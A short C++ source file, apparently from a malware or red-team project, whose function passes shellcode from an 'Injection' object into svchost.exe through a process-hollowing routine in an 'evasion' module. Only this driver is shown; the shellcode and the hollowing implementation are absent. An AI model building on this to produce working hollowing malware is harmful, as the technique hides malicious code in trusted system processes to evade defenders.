#include "Injection.h"
#include "evasion\ProcessHollowing.h"
#include <iostream>

void start_testing(void) {
	ProcessHollowing hollowing;

	Injection injection;
	injection.shellcode;

	std::string targetProcess = "C:\\Windows\\System32\\svchost.exe";

	hollowing.HollowProcess(targetProcess, injection.shellcode);
}